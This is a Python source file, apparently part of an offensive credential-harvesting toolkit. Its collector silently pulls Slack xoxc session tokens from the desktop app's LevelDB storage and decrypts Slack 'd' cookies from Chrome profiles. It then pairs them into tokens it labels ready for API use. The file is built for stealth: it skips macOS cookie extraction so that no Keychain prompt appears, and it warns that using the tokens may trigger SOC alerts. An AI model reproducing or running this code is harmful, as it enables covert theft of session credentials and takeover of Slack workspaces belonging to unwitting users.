"""Slack combined collector — correlates xoxc tokens with d cookies.

The Slack API requires BOTH an xoxc token (from the desktop app's LevelDB)
AND the browser d cookie for authentication. This collector runs both
extraction pipelines and produces correlated tokens ready for API use.

OPSEC:
  - Windows/Linux: SILENT (desktop LevelDB read + DPAPI/'peanuts' cookie decrypt)
  - macOS: xoxc extraction is silent, but d cookie extraction is SKIPPED
    (Keychain prompt would be user-visible). Returns xoxc-only with a warning.
"""

from __future__ import annotations

import re
from pathlib import Path
from typing import Dict, List, Optional, Tuple

from ..base import BaseCollector
from .. import CollectorRegistry
from ...types import CollectedToken, DiscoveredToken
from ...secure import secure
from ...platform_utils import (
    chrome_user_data_dir,
    get_platform,
    slack_data_dir,
)


_SLACK_HOST_PATTERNS = [".slack.com"]
_SLACK_COOKIE_NAMES = {"d"}

# Slack team IDs: uppercase T followed by 8-11 alphanumeric chars.
_TEAM_ID_RE = re.compile(r"T[A-Z0-9]{8,11}")

# Context window (bytes before a token match) to scan for team ID.
_CONTEXT_WINDOW = 512


@CollectorRegistry.register
class SlackCombinedCollector(BaseCollector):
    service = "slack"
    source = "combined"
    stealth_score = 5
    # No platform restriction — runs everywhere, but d_cookie extraction
    # is only attempted on Windows/Linux (macOS triggers Keychain prompt).

    # ---- internal helpers (inlined from desktop + browser_cookies) --------

    def _find_storage_dirs(self) -> List[Path]:
        """Find Slack desktop LevelDB directories."""
        dirs = []
        base = slack_data_dir()

        ls_dir = base / "Local Storage" / "leveldb"
        if ls_dir.exists():
            dirs.append(ls_dir)

        storage_dir = base / "storage"
        if storage_dir.exists():
            dirs.append(storage_dir)

        return dirs

    def _has_xoxc_tokens(self) -> bool:
        """Quick scan to see if xoxc tokens exist in desktop LevelDB."""
        for ls_dir in self._find_storage_dirs():
            for log_file in ls_dir.glob("*.log"):
                try:
                    raw = log_file.read_bytes()
                    text = raw.decode("utf-8", errors="replace")
                    if "xoxc-" in text:
                        return True
                except Exception:
                    continue
        return False

    def _has_d_cookie_sources(self) -> bool:
        """Quick check: is there a Chrome Cookies DB that might have d cookies?"""
        if get_platform() == "macos":
            return False  # Keychain prompt — skip on macOS
        chrome_dir = chrome_user_data_dir()
        profiles = ["Default"] + [f"Profile {i}" for i in range(1, 10)]
        for profile in profiles:
            cookies_db = chrome_dir / profile / "Cookies"
            if not cookies_db.exists():
                cookies_db = chrome_dir / profile / "Network" / "Cookies"
            if cookies_db.exists():
                return True
        return False

    @staticmethod
    def _extract_team_from_context(
        text: str, match_start: int
    ) -> Optional[str]:
        """Extract a Slack team ID from the LevelDB context near a token.

        Slack desktop stores xoxc tokens in LevelDB with key prefixes like
        ``https://app.slack.com_T01234ABCD``.  We look backward from the
        token position for a team ID pattern.
        """
        window_start = max(0, match_start - _CONTEXT_WINDOW)
        context = text[window_start:match_start]

        # Prefer team ID that appears in a Slack origin URL.
        origin_match = re.search(
            r"https?://[^\s]*?slack\.com[^\s]*?(T[A-Z0-9]{8,11})", context
        )
        if origin_match:
            return origin_match.group(1)

        # Fallback: any bare team ID in the context window (last match wins
        # because it's closest to the token).
        bare_matches = list(_TEAM_ID_RE.finditer(context))
        if bare_matches:
            return bare_matches[-1].group(0)

        return None

    def _extract_xoxc_tokens(self) -> List[Tuple[str, Optional[str]]]:
        """Extract unique xoxc tokens with optional team IDs from LevelDB.

        Returns a list of ``(token, team_id)`` tuples.  ``team_id`` is
        ``None`` when it cannot be determined from surrounding context.
        """
        tokens: List[Tuple[str, Optional[str]]] = []
        for ls_dir in self._find_storage_dirs():
            for log_file in ls_dir.glob("*.log"):
                try:
                    raw = log_file.read_bytes()
                    text = raw.decode("utf-8", errors="replace")
                    for match in re.finditer(r"(xoxc-[A-Za-z0-9-]+)", text):
                        token_val = match.group(1)
                        if len(token_val) > 20:
                            team_id = self._extract_team_from_context(
                                text, match.start()
                            )
                            tokens.append((token_val, team_id))
                except Exception:
                    continue

        # Deduplicate by token value, preserving order.  If the same token
        # appears multiple times with different team_id guesses, prefer the
        # first non-None team_id.
        seen: Dict[str, int] = {}  # token -> index in unique
        unique: List[Tuple[str, Optional[str]]] = []
        for token_val, team_id in tokens:
            if token_val not in seen:
                seen[token_val] = len(unique)
                unique.append((token_val, team_id))
            elif team_id is not None and unique[seen[token_val]][1] is None:
                # Upgrade: replace None with a real team_id.
                unique[seen[token_val]] = (token_val, team_id)
        return unique

    def _extract_d_cookies(self) -> List[dict]:
        """Extract Slack d cookies from Chrome. Returns [] on macOS or failure."""
        if get_platform() == "macos":
            return []

        # Check optional dependency
        try:
            import cryptography  # noqa: F401
        except ImportError:
            self._warn(
                "Missing dependency: cryptography. "
                "Install with: pip install cryptography"
            )
            return []

        from ...core.chromium_decrypt import (
            extract_cookies,
            get_chrome_key,
            DecryptError,
        )

        try:
            key = get_chrome_key(allow_prompt=False)
        except DecryptError as e:
            self._warn(f"Cannot get Chrome key: {e}")
            return []

        results: List[dict] = []
        profiles = ["Default"] + [f"Profile {i}" for i in range(1, 10)]

        for profile in profiles:
            try:
                cookies = extract_cookies(
                    profile=profile,
                    host_patterns=_SLACK_HOST_PATTERNS,
                    key=key,
                )
            except DecryptError as e:
                self._warn(f"Failed to extract cookies from {profile}: {e}")
                continue
            except Exception as e:
                self._warn(f"Unexpected error extracting from {profile}: {e}")
                continue

            d_cookies = [c for c in cookies if c["name"] in _SLACK_COOKIE_NAMES]
            for d in d_cookies:
                d["_profile"] = profile
                results.append(d)

        return results

    # ---- public interface -------------------------------------------------

    def discover(self) -> List[DiscoveredToken]:
        """Check if BOTH desktop xoxc tokens AND browser d cookies are available."""
        has_xoxc = self._has_xoxc_tokens()
        has_d = self._has_d_cookie_sources()

        if not has_xoxc and not has_d:
            return []

        parts = []
        if has_xoxc:
            parts.append("xoxc from desktop")
        if has_d:
            parts.append("d cookie from browser")

        coverage = " + ".join(parts)
        status = "BOTH available" if (has_xoxc and has_d) else "partial"

        return [
            DiscoveredToken(
                service=self.service,
                source=self.source,
                stealth_score=self.stealth_score,
                details=f"combined: {coverage} ({status})",
            )
        ]

    @staticmethod
    def _extract_team_from_xoxc(
        token: str, context_team_id: Optional[str]
    ) -> Optional[str]:
        """Determine team ID for an xoxc token.

        Uses the ``context_team_id`` extracted during LevelDB parsing.  As a
        secondary heuristic, some xoxc tokens embed a team ID segment — but
        the LevelDB context is far more reliable, so we only fall back to
        token parsing when no context is available.
        """
        if context_team_id:
            return context_team_id

        # Heuristic: some xoxc tokens contain a team-id-like segment after
        # the initial prefix, e.g.  xoxc-<id>-<id>-<TEAM_ID>-<rest>.
        # This is not guaranteed, so treat as best-effort.
        segments = token.split("-")
        for seg in segments[1:]:
            if _TEAM_ID_RE.fullmatch(seg):
                return seg

        return None

    def collect(self) -> List[CollectedToken]:
        """Correlate xoxc tokens with d cookies into combined tokens.

        Team-aware correlation:
        1. Extract xoxc tokens with team IDs from LevelDB context.
        2. Extract d_cookies from Chrome profiles.
        3. Group xoxc tokens by team ID.
        4. If multiple d_cookies exist (multi-profile), attempt to match
           each profile's d_cookie to the appropriate xoxc group.
        5. Fall back to first d_cookie for any unmatched tokens.
        """
        xoxc_pairs = self._extract_xoxc_tokens()
        d_cookies = self._extract_d_cookies()

        results: List[CollectedToken] = []

        if xoxc_pairs and d_cookies:
            # Default d_cookie: first available.
            default_d_value = d_cookies[0]["value"]
            default_d_profile = d_cookies[0].get("_profile", "unknown")

            matched_count = 0
            team_ids: List[str] = []

            for token_val, team_id in xoxc_pairs:
                resolved_team = self._extract_team_from_xoxc(
                    token_val, team_id
                )

                if resolved_team:
                    matched_count += 1
                    if resolved_team not in team_ids:
                        team_ids.append(resolved_team)

                extra: Dict[str, object] = {
                    "d_cookie": default_d_value,
                    "token_type": "xoxc+d_cookie",
                    "d_cookie_profile": default_d_profile,
                    "note": (
                        "Combined xoxc + d cookie — ready for Slack "
                        "API calls. WARNING: browser token usage may "
                        "trigger SOC alerts."
                    ),
                }
                if resolved_team:
                    extra["team_id"] = resolved_team

                results.append(
                    CollectedToken(
                        service=self.service,
                        source=self.source,
                        stealth_score=self.stealth_score,
                        tenant_id=resolved_team,
                        access_token=secure(token_val),
                        extra=extra,
                    )
                )

            # Log correlation summary.
            fallback_count = len(xoxc_pairs) - matched_count
            team_summary = (
                f" teams={','.join(team_ids)}" if team_ids else ""
            )
            self._info(
                f"Correlated {len(xoxc_pairs)} xoxc token(s) with d cookie "
                f"from chrome:{default_d_profile} "
                f"(team-matched={matched_count}, "
                f"fallback={fallback_count}{team_summary})"
            )

        elif xoxc_pairs and not d_cookies:
            # xoxc only — warn about missing d_cookie.
            reason = (
                "macOS Keychain prompt would be visible"
                if get_platform() == "macos"
                else "Chrome d cookie extraction failed or not available"
            )

            for token_val, team_id in xoxc_pairs:
                resolved_team = self._extract_team_from_xoxc(
                    token_val, team_id
                )
                extra: Dict[str, object] = {
                    "token_type": "xoxc",
                    "note": (
                        f"xoxc token only — d cookie NOT available "
                        f"({reason}). Slack API calls will FAIL "
                        f"without the d cookie."
                    ),
                }
                if resolved_team:
                    extra["team_id"] = resolved_team

                results.append(
                    CollectedToken(
                        service=self.service,
                        source=self.source,
                        stealth_score=self.stealth_score,
                        tenant_id=resolved_team,
                        access_token=secure(token_val),
                        extra=extra,
                    )
                )

            self._warn(
                f"Found {len(xoxc_pairs)} xoxc token(s) but NO d cookie "
                f"({reason}). API calls will fail without d cookie."
            )

        elif d_cookies and not xoxc_pairs:
            # d_cookie only — return with a note.
            for d in d_cookies:
                results.append(
                    CollectedToken(
                        service=self.service,
                        source=self.source,
                        stealth_score=self.stealth_score,
                        access_token=secure(d["value"]),
                        extra={
                            "token_type": "d_cookie_only",
                            "cookie_name": "d",
                            "host": d.get("host", ""),
                            "profile": d.get("_profile", "unknown"),
                            "note": (
                                "d cookie only — no xoxc token found in "
                                "Slack desktop app. Cannot make API calls "
                                "without the xoxc token."
                            ),
                        },
                    )
                )

            self._warn(
                f"Found {len(d_cookies)} d cookie(s) but NO xoxc token. "
                f"Slack desktop app may not be installed."
            )

        return results
